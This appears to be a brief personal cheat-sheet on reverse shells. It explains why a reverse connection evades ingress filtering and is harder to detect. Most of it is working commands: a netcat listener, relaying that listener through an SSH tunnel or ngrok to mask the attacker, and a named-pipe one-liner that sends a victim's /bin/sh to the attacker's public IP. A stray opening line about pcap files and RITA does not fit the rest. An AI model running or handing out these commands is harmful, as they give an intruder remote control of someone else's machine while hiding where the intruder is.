Network

You will need pcap files for that: https://www.activecountermeasures.com/free-tools/rita/. Forward: attacker connects to the victim. Reverse: victim connects to the attacker (harder to detect). Usually, ingress traffic is highly restrictive, unlike the egress one. That’s why it’s stealthier to use a reverse shell.

# On attacker's machine
nc -l 1234 # open the listener (attacker's machine)
# optionally relay this listener to another service.
ssh -R 1234:localhost:1234 relay@relay # or..
ngrok tcp 1234

# On the victim's machine (most likely, remotely)
mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc attackerspublicIP 1234 1>/tmp/backpipe
